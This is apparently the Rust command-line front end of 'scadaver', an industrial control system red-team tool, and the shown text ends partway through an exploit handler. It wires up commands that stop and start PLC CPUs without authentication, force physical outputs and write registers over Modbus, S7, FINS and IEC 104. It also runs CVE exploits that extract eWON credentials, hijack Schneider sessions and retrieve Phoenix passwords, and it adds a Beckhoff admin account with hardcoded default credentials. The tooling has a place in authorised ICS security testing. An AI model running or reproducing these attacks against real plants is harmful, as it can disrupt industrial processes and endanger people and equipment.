use anyhow::Result;
use clap::{Parser, Subcommand, ValueEnum};

#[derive(Parser)]
#[command(
    name = "scadaver",
    version = "1.0.0",
    about = "Unified ICS Red Team Multi-Tool (Rust)",
    long_about = None,
)]
pub struct Args {
    #[command(subcommand)]
    pub command: Option<Command>,
}

#[derive(Subcommand)]
pub enum Command {
    /// Discover ICS devices on the network
    Scan {
        #[command(subcommand)]
        sub: ScanCmd,
    },
    /// Control ICS device states and I/O
    Control {
        #[command(subcommand)]
        sub: ControlCmd,
    },
    /// Run ICS exploitation modules
    Exploit {
        #[command(subcommand)]
        sub: ExploitCmd,
    },
    /// Interact with Rockwell Allen-Bradley Logix PLCs via EtherNet/IP
    Rockwell {
        #[command(subcommand)]
        sub: RockwellCmd,
    },
    /// Interact with Siemens S7 PLCs over `S7Comm` (port 102)
    Siemens {
        #[command(subcommand)]
        sub: SiemensCmd,
    },
    /// Interact with Phoenix Contact `WebVisit` HMI tag values (CVE-2016-8380)
    Phoenix {
        #[command(subcommand)]
        sub: PhoenixCmd,
    },
    /// Interact with Omron PLCs via FINS protocol (TCP/UDP port 9600)
    Omron {
        #[command(subcommand)]
        sub: OmronCmd,
    },
    /// Interact with IEC 60870-5-104 outstations (TCP port 2404)
    Iec104 {
        #[command(subcommand)]
        sub: Iec104Cmd,
    },
    /// Manually add or remove devices from the device database
    Db {
        #[command(subcommand)]
        sub: DbCmd,
    },
    /// SNMP enumeration, community scan, and write testing (UDP 161)
    Snmp {
        #[command(subcommand)]
        sub: SnmpCmd,
    },
}

// ===================================================================
// scan subcommands
// ===================================================================

#[derive(Clone, Copy, Debug, ValueEnum)]
pub enum SchneiderScanTransport {
    Both,
    Udp,
    Tcp,
}

#[derive(Clone, Copy, Debug, ValueEnum)]
pub enum MitsubishiScanTransport {
    Both,
    Udp,
    Tcp,
}

#[derive(Subcommand)]
pub enum ScanCmd {
    /// Scan for EtherNet/IP (CIP) devices (UDP 44818)
    Enip {
        #[arg(short, long, default_value = "5")]
        timeout: u64,
        #[arg(short, long)]
        ip: Option<String>,
    },
    /// Scan for eWON devices (UDP broadcast)
    Ewon {
        #[arg(short, long, default_value = "3")]
        timeout: u64,
        #[arg(short, long)]
        ip: Option<String>,
    },
    /// Scan for Schneider Electric devices (UDP discovery or Modbus TCP)
    Schneider {
        #[arg(short, long, default_value = "2")]
        timeout: u64,
        #[arg(short, long)]
        ip: Option<String>,
        /// Transport for targeted scans: udp, tcp, or both
        #[arg(long, value_enum, default_value = "both")]
        transport: SchneiderScanTransport,
        /// Modbus TCP port for targeted TCP scans
        #[arg(long, default_value = "502")]
        port: u16,
    },
    /// Scan for Mitsubishi MELSEC devices (UDP 5561/5006)
    Mitsubishi {
        #[arg(short, long, default_value = "3")]
        timeout: u64,
        #[arg(short, long)]
        ip: Option<String>,
        /// Transport for targeted scans: udp, tcp, or both
        #[arg(long, value_enum, default_value = "both")]
        transport: MitsubishiScanTransport,
        /// SLMP TCP port for targeted TCP scans
        #[arg(long, default_value = "5007")]
        port: u16,
    },
    /// Scan for Beckhoff `TwinCAT` devices (UDP 48899, ADS TCP fallback)
    Beckhoff {
        #[arg(short, long, default_value = "2")]
        timeout: u64,
        #[arg(short, long)]
        ip: Option<String>,
        /// ADS TCP port for targeted fallback scans (default: 48898)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// Scan a Siemens device by IP (`S7Comm` TCP 102)
    Siemens {
        #[arg(short, long)]
        ip: String,
        #[arg(short, long, default_value = "102")]
        port: u16,
    },
    /// Auto-detect vendor and info for any IP
    Auto {
        #[arg(short, long)]
        ip: String,
        #[arg(short, long, default_value = "3")]
        timeout: u64,
    },
}

// ===================================================================
// control subcommands
// ===================================================================

#[derive(Subcommand)]
pub enum ControlCmd {
    /// Set Mitsubishi PLC to run/stop/pause
    Mitsubishi {
        #[arg(short, long)]
        target: String,
        /// State: run / stop / pause
        #[arg(short, long)]
        state: String,
    },
    /// Control Phoenix Contact ILC 150/390 PLC
    Phoenix {
        #[arg(short, long)]
        target: String,
        /// Model: ilc150 / ilc390
        #[arg(short, long)]
        model: String,
        /// Action: cold / warm / hot / stop / info
        #[arg(short, long)]
        action: String,
    },
    /// Read/write Siemens S7 inputs, outputs, and merkers
    SiemensIo {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "102")]
        port: u16,
        #[arg(long)]
        read: bool,
        /// Binary output string e.g. 10110000
        #[arg(long)]
        outputs: Option<String>,
        /// Binary merkers and optional byte offset, e.g. 01010101,3
        #[arg(long)]
        merkers: Option<String>,
    },
    /// Query or toggle Siemens S7 CPU state
    SiemensCpu {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "102")]
        port: u16,
        /// Flip current state (run<->stop)
        #[arg(long)]
        flip: bool,
    },
    /// Control Beckhoff `TwinCAT` state
    BeckhoffTc {
        #[arg(short, long)]
        target: String,
        /// Override ADS TCP port (default: 48898)
        #[arg(short, long, default_value = "0")]
        port: u16,
        /// State: run / config / stop (omit for info only)
        #[arg(short, long)]
        state: Option<String>,
    },
}

// ===================================================================
// exploit subcommands
// ===================================================================

#[derive(Subcommand)]
pub enum ExploitCmd {
    /// Extract credentials from eWON Flexy (auth bypass)
    EwonCreds {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "20")]
        max_users: u32,
        /// Override port (default: 80)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// Flash LED on a Schneider Electric PLC
    SchneiderFlash {
        #[arg(short, long)]
        target: String,
    },
    /// CVE-2017-6026: Session hijack on Schneider M340
    SchneiderHijack {
        #[arg(short, long)]
        target: String,
        /// Action: info / run / stop (default: info)
        #[arg(short, long, default_value = "info")]
        action: String,
    },
    /// CVE-2016-8366: Retrieve passwords from Phoenix `WebVisit` HMI
    PhoenixPasswords {
        #[arg(short, long)]
        target: String,
        /// Override HTTP port (default: 80)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// CVE-2016-8380: Read/write HMI tag values on Phoenix PLCs
    PhoenixTags {
        #[arg(short, long)]
        target: String,
        /// Override HTTP port (default: 80)
        #[arg(long, default_value = "0")]
        port: u16,
        #[arg(long)]
        read: bool,
        /// TAG=value to write
        #[arg(long)]
        write: Option<String>,
    },
    /// CVE-2015-4051: Reboot Beckhoff CX9020 via UPnP/SOAP
    BeckhoffReboot {
        #[arg(short, long)]
        target: String,
        /// Override web control port (default: 5120)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// Add admin user to Beckhoff CX9020 via UPnP/SOAP
    BeckhoffUser {
        #[arg(short, long)]
        target: String,
        /// Override web control port (default: 5120)
        #[arg(long, default_value = "0")]
        port: u16,
        #[arg(short, long, default_value = "scadaver_admin")]
        username: String,
        #[arg(short, long, default_value = "Sc4d4v3r!")]
        password: String,
    },
    /// Write raw bytes to a Beckhoff `TwinCAT` ADS symbol by name
    BeckhoffWriteSymbol {
        #[arg(short, long)]
        target: String,
        /// Override ADS TCP port (default: 48898)
        #[arg(long, default_value = "0")]
        port: u16,
        /// SymbolName=hexbytes, e.g. MAIN.valve=01
        input: String,
    },
    /// Modbus FC1: read coils
    ModbusReadCoils {
        #[arg(short, long)]
        target: String,
        /// Start address (0-based)
        #[arg(short, long, default_value = "0")]
        start: u16,
        /// Number of coils to read (max 2000)
        #[arg(short, long, default_value = "16")]
        count: u16,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// Modbus FC3: read holding registers
    ModbusReadRegisters {
        #[arg(short, long)]
        target: String,
        /// Start address (0-based)
        #[arg(short, long, default_value = "0")]
        start: u16,
        /// Number of registers to read (max 125)
        #[arg(short, long, default_value = "10")]
        count: u16,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// Modbus FC4: read input registers
    ModbusReadInputRegisters {
        #[arg(short, long)]
        target: String,
        /// Start address (0-based)
        #[arg(short, long, default_value = "0")]
        start: u16,
        /// Number of registers to read (max 125)
        #[arg(short, long, default_value = "10")]
        count: u16,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// Modbus FC5: write a single coil
    ModbusWriteCoil {
        #[arg(short, long)]
        target: String,
        /// Coil address (0-based)
        #[arg(short, long)]
        address: u16,
        /// on / off
        #[arg(short, long, default_value = "on")]
        state: String,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// Modbus FC6: write a single holding register
    ModbusWriteRegister {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        address: u16,
        #[arg(short, long)]
        value: u16,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// Modbus FC16: write multiple holding registers
    ModbusWriteRegisters {
        #[arg(short, long)]
        target: String,
        #[arg(short, long)]
        start: u16,
        /// Comma-separated u16 values, e.g. 100,200,300
        values: String,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// FC90: unauthenticated STOP on Schneider M340/Quantum/Premium
    Fc90Stop {
        #[arg(short, long)]
        target: String,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// FC90: unauthenticated START on Schneider M340/Quantum/Premium
    Fc90Start {
        #[arg(short, long)]
        target: String,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// FC90: unauthenticated STOP on Schneider TM221
    Fc90StopTm221 {
        #[arg(short, long)]
        target: String,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// FC90: unauthenticated START on Schneider TM221
    Fc90StartTm221 {
        #[arg(short, long)]
        target: String,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// FC90: force a physical output bit on Schneider M340
    Fc90Force {
        #[arg(short, long)]
        target: String,
        /// Output byte in hex, e.g. 0x11
        #[arg(long, default_value = "0x11")]
        output: String,
        /// on / off / unforce
        #[arg(long, default_value = "on")]
        state: String,
        /// Override port (default: 502)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// SLMP: read D (word) registers on Mitsubishi MELSEC
    SlmpReadD {
        #[arg(short, long)]
        target: String,
        #[arg(long, default_value = "0")]
        start: u32,
        #[arg(short, long, default_value = "10")]
        count: u16,
        /// Override port (default: 5007)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// SLMP: read M (bit) devices on Mitsubishi MELSEC
    SlmpReadM {
        #[arg(short, long)]
        target: String,
        #[arg(long, default_value = "0")]
        start: u32,
        #[arg(short, long, default_value = "16")]
        count: u16,
        /// Override port (default: 5007)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// SLMP: write D (word) registers on Mitsubishi MELSEC
    SlmpWriteD {
        #[arg(short, long)]
        target: String,
        #[arg(long)]
        start: u32,
        /// Comma-separated u16 values, e.g. 100,200
        values: String,
        /// Override port (default: 5007)
        #[arg(long, default_value = "0")]
        port: u16,
    },
    /// SLMP: write M (bit) devices on Mitsubishi MELSEC
    SlmpWriteM {
        #[arg(short, long)]
        target: String,
        #[arg(long)]
        start: u32,
        /// Binary string of bit values, e.g. 0110
        bits: String,
        /// Override port (default: 5007)
        #[arg(long, default_value = "0")]
        port: u16,
    },
}

// ===================================================================
// rockwell subcommands
// ===================================================================

#[derive(Subcommand)]
pub enum RockwellCmd {
    /// List all tags on a Logix PLC
    Tags {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "44818")]
        port: u16,
    },
    /// Read one tag (or list all if TAG is omitted)
    Read {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "44818")]
        port: u16,
        /// Tag name (omit to enumerate all tags)
        tag: Option<String>,
    },
    /// Write TAG=value pairs (hex bytes, space-separated for the value)
    Write {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "44818")]
        port: u16,
        /// TAG=HEXVALUE, e.g. MyBool=01 or MyInt=0100
        #[arg(required = true)]
        assignments: Vec<String>,
    },
    /// Get Logix controller identity (vendor, firmware, serial)
    Info {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "44818")]
        port: u16,
    },
}

// ===================================================================
// siemens subcommands
// ===================================================================

#[derive(Subcommand)]
pub enum SiemensCmd {
    /// Query Siemens S7 CPU state
    Cpu {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "102")]
        port: u16,
        #[arg(long)]
        flip: bool,
        #[arg(long)]
        password: Option<String>,
    },
    /// Read all I/O data (inputs, outputs, merkers)
    Io {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "102")]
        port: u16,
        #[arg(long)]
        password: Option<String>,
    },
    /// Write raw bytes to a Siemens S7 Data Block
    WriteDb {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "102")]
        port: u16,
        /// Data block number, e.g. 1
        #[arg(long)]
        db: u16,
        /// Byte offset within the DB
        #[arg(long, default_value = "0")]
        offset: u16,
        /// Data as hex string, e.g. deadbeef
        data: String,
        #[arg(long)]
        password: Option<String>,
    },
}

// ===================================================================
// db subcommands
// ===================================================================

#[derive(Subcommand)]
pub enum DbCmd {
    /// Add a device IP to the database
    Add {
        #[arg(long)]
        ip: String,
        /// Vendor label (default: unknown)
        #[arg(long)]
        vendor: Option<String>,
    },
    /// Remove a device from the database by ID
    Remove {
        /// Device ID (visible in TUI)
        #[arg(long)]
        id: i64,
    },
}

// ===================================================================
// omron subcommands
// ===================================================================

#[derive(Subcommand)]
pub enum OmronCmd {
    /// Get Omron device info (model, version, CPU state) via FINS
    Info {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "9600")]
        port: u16,
    },
    /// Read DM word registers
    ReadDm {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "9600")]
        port: u16,
        #[arg(long, default_value = "0")]
        start: u16,
        #[arg(long, default_value = "10")]
        count: u16,
    },
    /// Write DM word registers
    WriteDm {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "9600")]
        port: u16,
        #[arg(long, default_value = "0")]
        start: u16,
        /// Comma-separated u16 values
        values: String,
    },
    /// Read CPU operating mode (Run/Stop/Program)
    CpuStatus {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "9600")]
        port: u16,
    },
    /// Set CPU to Monitor/Run mode
    CpuRun {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "9600")]
        port: u16,
    },
    /// Set CPU to Stop mode
    CpuStop {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "9600")]
        port: u16,
    },
}

// ===================================================================
// iec104 subcommands
// ===================================================================

#[derive(Subcommand)]
pub enum Iec104Cmd {
    /// Send General Interrogation and list all data objects
    Gi {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "2404")]
        port: u16,
    },
    /// Send Single Command ON to an IOA
    ScOn {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "2404")]
        port: u16,
        /// Information Object Address
        #[arg(long)]
        ioa: u32,
    },
    /// Send Single Command OFF to an IOA
    ScOff {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "2404")]
        port: u16,
        #[arg(long)]
        ioa: u32,
    },
    /// Send Double Command to an IOA (state: 1=off, 2=on, 3=indeterminate)
    Dc {
        #[arg(short, long)]
        target: String,
        #[arg(short, long, default_value = "2404")]
        port: u16,
        #[arg(long)]
        ioa: u32,
        #[arg(long, default_value = "2")]
        state: u8,
    },
}

// ===================================================================
// phoenix subcommands
// ===================================================================

#[derive(Subcommand)]
pub enum PhoenixCmd {
    /// List tags from Phoenix `WebVisit` HMI
    Tags {
        #[arg(short, long)]
        target: String,
        /// Override HTTP port (default: 80)
        #[arg(short, long, default_value = "0")]
        port: u16,
    },
    /// Read current tag values from Phoenix `WebVisit` HMI
    ReadTags {
        #[arg(short, long)]
        target: String,
        /// Override HTTP port (default: 80)
        #[arg(short, long, default_value = "0")]
        port: u16,
    },
    /// Write a tag value to Phoenix `WebVisit` HMI
    WriteTag {
        #[arg(short, long)]
        target: String,
        /// Override HTTP port (default: 80)
        #[arg(short, long, default_value = "0")]
        port: u16,
        /// Tag name
        name: String,
        /// New value
        value: String,
    },
    /// Retrieve passwords (CVE-2016-8366)
    Passwords {
        #[arg(short, long)]
        target: String,
        /// Override HTTP port (default: 80)
        #[arg(short, long, default_value = "0")]
        port: u16,
    },
    /// Get Phoenix `ProConOS` device info (port 1962)
    Info {
        #[arg(short, long)]
        target: String,
        /// Override `ProConOS` info port (default: 1962)
        #[arg(short, long, default_value = "0")]
        port: u16,
    },
}

// ===================================================================
// Dispatcher
// ===================================================================

pub fn run(args: Args) -> Result<()> {
    crate::display::print_banner();
    let Some(command) = args.command else { return Ok(()); };
    match command {
        Command::Scan { sub } => run_scan(sub),
        Command::Control { sub } => { run_control(sub); Ok(()) }
        Command::Exploit { sub } => run_exploit(sub),
        Command::Rockwell { sub } => { run_rockwell(sub); Ok(()) }
        Command::Siemens { sub } => { run_siemens(sub); Ok(()) }
        Command::Phoenix { sub } => run_phoenix(sub),
        Command::Omron { sub } => { run_omron(sub); Ok(()) }
        Command::Iec104 { sub } => run_iec104(sub),
        Command::Db { sub } => run_db(sub),
        Command::Snmp { sub } => run_snmp(sub),
    }
}

// ===================================================================
// Scan handlers
// ===================================================================

#[allow(clippy::too_many_lines)]
fn run_scan(cmd: ScanCmd) -> Result<()> {
    use crate::core::network::{get_interfaces, select_interface};

    match cmd {
        ScanCmd::Enip { timeout, ip } => {
            use crate::vendors::enip::scan;
            if let Some(target) = ip {
                crate::display::print_info(&format!("Scanning {target} for EtherNet/IP…"));
                let devs = scan::scan_ip(&target, timeout, false)?;
                if devs.is_empty() {
                    crate::display::print_warn("No EtherNet/IP devices found.");
                }
            } else {
                let ifaces = get_interfaces();
                let iface = select_interface(&ifaces)?;
                crate::display::print_info("Broadcasting EtherNet/IP discovery…");
                let devs = scan::scan(&iface, timeout, false)?;
                crate::display::print_success(&format!("Found {} device(s).", devs.len()));
            }
        }

        ScanCmd::Ewon { timeout, ip } => {
            use crate::vendors::ewon::scan;
            if let Some(target) = ip {
                crate::display::print_info(&format!("Scanning {target} for eWON…"));
                let devs = scan::scan_ip(&target, timeout, false)?;
                if devs.is_empty() {
                    crate::display::print_warn("No eWON devices found.");
                }
            } else {
                let ifaces = get_interfaces();
                let iface = select_interface(&ifaces)?;
                crate::display::print_info("Broadcasting eWON IPCONF discovery…");
                let devs = scan::scan(&iface, timeout, false)?;
                crate::display::print_success(&format!("Found {} response(s).", devs.len()));
            }
        }

        ScanCmd::Schneider {
            timeout,
            ip,
            transport,
            port,
        } => {
            use crate::vendors::schneider::scan;
            if let Some(target) = ip {
                crate::display::print_info(&format!("Scanning {target} for Schneider…"));
                let transport = match transport {
                    SchneiderScanTransport::Both => scan::Transport::Both,
                    SchneiderScanTransport::Udp => scan::Transport::Udp,
                    SchneiderScanTransport::Tcp => scan::Transport::Tcp,
                };
                let devs = scan::scan_ip_with_transport(&target, timeout, false, port, transport)?;
                if devs.is_empty() {
                    crate::display::print_warn("No Schneider devices found.");
                }
            } else {
                if matches!(transport, SchneiderScanTransport::Tcp) {
                    crate::display::print_error("TCP Schneider scans require --ip.");
                    return Ok(());
                }
                let ifaces = get_interfaces();
                let iface = select_interface(&ifaces)?;
                crate::display::print_info("Broadcasting Schneider discovery (UDP 1740)…");
                let devs = scan::scan(&iface, timeout, false)?;
                crate::display::print_success(&format!("Found {} device(s).", devs.len()));
            }
        }

        ScanCmd::Mitsubishi {
            timeout,
            ip,
            transport,
            port,
        } => {
            use crate::vendors::mitsubishi::scan;
            if let Some(target) = ip {
                crate::display::print_info(&format!("Scanning {target} for Mitsubishi…"));
                let transport = match transport {
                    MitsubishiScanTransport::Both => scan::Transport::Both,
                    MitsubishiScanTransport::Udp => scan::Transport::Udp,
                    MitsubishiScanTransport::Tcp => scan::Transport::Tcp,
                };
                let devs = scan::scan_ip_with_transport(&target, timeout, false, port, transport)?;
                if devs.is_empty() {
                    crate::display::print_warn("No Mitsubishi devices found.");
                }
            } else {
                if matches!(transport, MitsubishiScanTransport::Tcp) {
                    crate::display::print_error("TCP Mitsubishi scans require --ip.");
                    return Ok(());
                }
                let ifaces = get_interfaces();
                let iface = select_interface(&ifaces)?;
                crate::display::print_info("Broadcasting Mitsubishi MELSEC discovery…");
                let devs = scan::scan(&iface, timeout, false)?;
                crate::display::print_success(&format!("Found {} device(s).", devs.len()));
            }
        }

        ScanCmd::Beckhoff { timeout, ip, port } => {
            use crate::vendors::beckhoff::scan;
            if let Some(target) = ip {
                crate::display::print_info(&format!("Scanning {target} for Beckhoff TwinCAT…"));
                let devs = scan::discover_ip_with_port(&target, timeout, false, port)?;
                if devs.is_empty() {
                    crate::display::print_warn("No Beckhoff devices found.");
                }
            } else {
                let ifaces = get_interfaces();
                let iface = select_interface(&ifaces)?;
                crate::display::print_info("Broadcasting Beckhoff ADS discovery (UDP 48899)…");
                let devs = scan::discover(&iface, timeout, false)?;
                crate::display::print_success(&format!("Found {} device(s).", devs.len()));
            }
        }

        ScanCmd::Siemens { ip, port } => {
            use crate::vendors::siemens::scan;
            crate::display::print_info(&format!("Scanning {ip} for Siemens S7…"));
            let dev = scan::scan_ip_with_port(&ip, port);
            println!("  IP:       {}", dev.ip);
            if let Some(hw) = &dev.hardware {
                println!("  Hardware: {hw}");
            }
            if let Some(fw) = &dev.firmware {
                println!("  Firmware: {fw}");
            }
            if let Some(cs) = &dev.cpu_state {
                println!("  CPU:      {cs}");
            }
            if !dev.open_ports.is_empty() {
                let ports: Vec<String> = dev.open_ports.iter().map(ToString::to_string).collect();
                println!("  Ports:    {}", ports.join(", "));
            }
        }

        ScanCmd::Auto { ip, timeout } => {
            use colored::Colorize;
            crate::display::print_info(&format!("Scanning {ip} across all protocols…"));
            println!();
            let outcomes = crate::core::autodetect::sweep(&ip, timeout);
            for outcome in &outcomes {
                let (tag, detail) = match &outcome.device {
                    Some(dev) => ("[+]".green().bold(), summarize_device(dev).normal()),
                    None => ("[-]".yellow().bold(), "no response".dimmed()),
                };
                println!(
                    "{tag} {:<18} {:<22} {detail}",
                    outcome.probe.label, outcome.probe.transport
                );
            }
            let responded = outcomes.iter().filter(|o| o.device.is_some()).count();
            println!();
            crate::display::print_success(&format!(
                "{responded}/{} protocol(s) responded.",
                outcomes.len()
            ));
        }
    }
    Ok(())
}

// ===================================================================
// Control handlers
// ===================================================================

#[allow(clippy::too_many_lines)]
fn run_control(cmd: ControlCmd) {
    match cmd {
        ControlCmd::Mitsubishi { target, state } => {
            use crate::core::network::NetworkInterface;
            use crate::vendors::mitsubishi::control;
            let iface = NetworkInterface {
                name: "auto".into(),
                ip: local_ip_for(&target),
                netmask: "255.255.255.0".into(),
            };
            crate::display::print_info(&format!("Setting Mitsubishi PLC to {state}…"));
            match control::set_state_ip(&iface, &target, &state.to_lowercase()) {
                Ok(true) => crate::display::print_success("Command sent."),
                Ok(false) => crate::display::print_warn("Command sent (no confirmation)."),
                Err(e) => crate::display::print_error(&format!("Failed: {e}")),
            }
        }

        ControlCmd::Phoenix {
            target,
            model,
            action,
        } => {
            use crate::vendors::phoenix::control;
            match action.to_lowercase().as_str() {
                "info" => {
                    let pb = crate::display::spinner_start(&format!("Querying {target}…"));
                    let result = control::get_device_info(&target, 0, false);
                    pb.finish_and_clear();
                    match result {
                        Ok(info) => {
                            crate::display::print_success("Device info retrieved.");
                            println!("  PLC Type: {}", info.plc_type);
                            if let Some(fw) = info.firmware {
                                println!("  Firmware: {fw}");
                            }
                        }
                        Err(e) => crate::display::print_error(&format!("{e}")),
                    }
                }
                a => {
                    let pb = crate::display::spinner_start(&format!("Sending {a} to {target}…"));
                    let result = if model.eq_ignore_ascii_case("ilc390") {
                        let action_str = if a == "stop" { "stop" } else { "start" };
                        control::control_ilc390(&target, 0, action_str)
                    } else {
                        let action_str = if a == "stop" { "stop" } else { "start" };
                        let start_type = match a {
                            "warm" => "warm",
                            "hot" => "hot",
                            _ => "cold",
                        };
                        control::control_ilc150(&target, 0, action_str, start_type)
                    };
                    pb.finish_and_clear();
                    match result {
                        Ok(state) => crate::display::print_success(&format!("State: {state}")),
                        Err(e) => crate::display::print_error(&format!("{e}")),
                    }
                }
            }
        }

        ControlCmd::SiemensIo {
            target,
            port,
            read,
            outputs,
            merkers,
        } => {
            use crate::vendors::siemens::s7comm;
            let wrote_outputs = outputs.is_some();
            let wrote_merkers = merkers.is_some();
            if let Some(ref bits) = outputs {
                crate::display::print_info(&format!("Writing outputs to {target}…"));
                if s7comm::set_outputs(&target, bits, port, 5, None) {
                    crate::display::print_success("Outputs written.");
                } else {
                    crate::display::print_error("Failed to write outputs.");
                }
            }
            if let Some(ref merker_str) = merkers {
                let parts: Vec<&str> = merker_str.splitn(2, ',').collect();
                let bits = parts[0];
                let offset: u32 = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(0);
                crate::display::print_info(&format!(
                    "Writing merkers to {target} (offset {offset})…"
                ));
                if s7comm::set_merkers(&target, bits, offset, port, 5, None) {
                    crate::display::print_success("Merkers written.");
                } else {
                    crate::display::print_error("Failed to write merkers.");
                }
            }
            if read || (!wrote_outputs && !wrote_merkers) {
                let pb = crate::display::spinner_start(&format!("Reading I/O from {target}…"));
                let data = s7comm::read_all_data(&target, port, 5, None);
                pb.finish_and_clear();
                for area in &["inputs", "outputs", "merkers"] {
                    if let Some(Some(bits)) = data.get(*area) {
                        println!("  {area}:");
                        let mut keys: Vec<&String> = bits.keys().collect();
                        keys.sort();
                        for bit in keys {
                            println!("    {bit}: {}", bits[bit]);
                        }
                    }
                }
            }
        }

        ControlCmd::SiemensCpu { target, port, flip } => {
            use crate::vendors::siemens::s7comm;
            let state = s7comm::get_cpu_state(&target, port, 5, None);
            crate::display::print_info(&format!("CPU state: {state}"));
            if flip {
                if s7comm::change_cpu_state(&target, port, 5) {
                    let new_state = s7comm::get_cpu_state(&target, port, 5, None);
                    crate::display::print_success(&format!("New state: {new_state}"));
                } else {
                    crate::display::print_error("Failed to change CPU state.");
                }
            }
        }

        ControlCmd::BeckhoffTc {
            target,
            port,
            state,
        } => {
            use crate::vendors::beckhoff::{ads, scan};
            let local_ip = local_ip_for(&target);
            let local_netid = ads::build_local_netid(&local_ip);

            let pb = crate::display::spinner_start(&format!("Discovering {target}…"));
            let devs = scan::discover_ip_with_port(&target, 2, true, port).unwrap_or_default();
            pb.finish_and_clear();

            let Some(dev) = devs.into_iter().next() else {
                crate::display::print_error("Beckhoff device not found via ADS discovery.");
                return;
            };

            if let Some(s) = state {
                crate::display::print_info(&format!("Setting TwinCAT state to {s}…"));
                match scan::set_twincat_state(&dev, &local_netid, &s, port) {
                    Ok(_) => crate::display::print_success("State command sent."),
                    Err(e) => crate::display::print_error(&format!("{e}")),
                }
            } else {
                let pb2 = crate::display::spinner_start("Reading full device info…");
                let result = scan::get_device_info_full(&dev, &local_netid, port);
                pb2.finish_and_clear();
                match result {
                    Some(info) => {
                        println!("  Name:       {}", info.name);
                        println!("  NetID:      {}", info.netid);
                        if let Some(os) = &info.os_name {
                            println!("  OS:         {os}");
                        }
                        println!("  TwinCAT:    {}", info.tc_version);
                    }
                    None => crate::display::print_warn("Could not retrieve full device info."),
                }
            }
        }
    }
}

// ===================================================================
// Exploit handlers
// ===================================================================

#[allow(clippy::too_many_lines)]
fn run_exploit(cmd: ExploitCmd) -> Result<()> {
    match cmd {
        ExploitCmd::EwonCreds {
            target,
            max_users,
            port,
        } => {
            use crate::vendors::ewon::exploit;
            crate::display::print_info(&format!("Extracting credentials from {target}…"));
            let users = exploit::exploit(&target, port, "adm", max_users);
            if users.is_empty() {
                crate::display::print_warn("No credentials extracted.");
            } else {
                crate::display::print_success(&format!("Extracted {} credential(s).", users.len()));
            }
        }

        ExploitCmd::SchneiderFlash { target } => {
            use crate::vendors::schneider::flash_led;
            crate::display::print_info(&format!("Sending Flash LED to {target}…"));
            match flash_led::flash_led_ip(&target) {
                Ok(()) => crate::display::print_success("Flash LED command sent."),
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::SchneiderHijack { target, action } => {
            use crate::vendors::schneider::session_hijack;
            let pb = crate::display::spinner_start(&format!("Fetching session from {target}…"));
            let session = session_hijack::get_session_cookie(&target, 0);
            pb.finish_and_clear();
            let Some(session) = session else {
                crate::display::print_error("Failed to get session cookie.");
                return Ok(());
            };
            crate::display::print_success(&format!(
                "Cookie: {} (booted {} times)",
                session.cookie_value, session.power_on_count
            ));
            match action.as_str() {
                "info" => {
                    session_hijack::get_device_info(
                        &target,
                        0,
                        &session.cookie_value,
                        "Administrator",
                    );
                }
                a => {
                    let ok = session_hijack::control_plc(
                        &target,
                        0,
                        &session.cookie_value,
                        "Administrator",
                        a,
                    );
                    if ok {
                        crate::display::print_success(&format!("PLC {a} command sent."));
                    } else {
                        crate::display::print_error(&format!("Failed to {a} PLC."));
                    }
                }
            }
        }

        ExploitCmd::PhoenixPasswords { target, port } => {
            use crate::vendors::phoenix::webvisit;
            let pb = crate::display::spinner_start(&format!("Retrieving passwords from {target}…"));
            let result = webvisit::retrieve_passwords(&target, port);
            pb.finish_and_clear();
            match result {
                Ok(entries) if entries.is_empty() => {
                    crate::display::print_warn("No passwords retrieved.");
                }
                Ok(entries) => {
                    crate::display::print_success(&format!(
                        "Found {} password entry/entries.",
                        entries.len()
                    ));
                    for e in &entries {
                        if let Some(p) = &e.password {
                            println!("  User Level {}: {p}", e.user_level);
                        } else if let Some(h) = &e.hash {
                            println!("  User Level {} (SHA256): {h}", e.user_level);
                        }
                    }
                }
                Err(e) => crate::display::print_error(&format!("{e}")),
            }
        }

        ExploitCmd::PhoenixTags {
            target,
            port,
            read,
            write,
        } => {
            use crate::vendors::phoenix::webvisit;
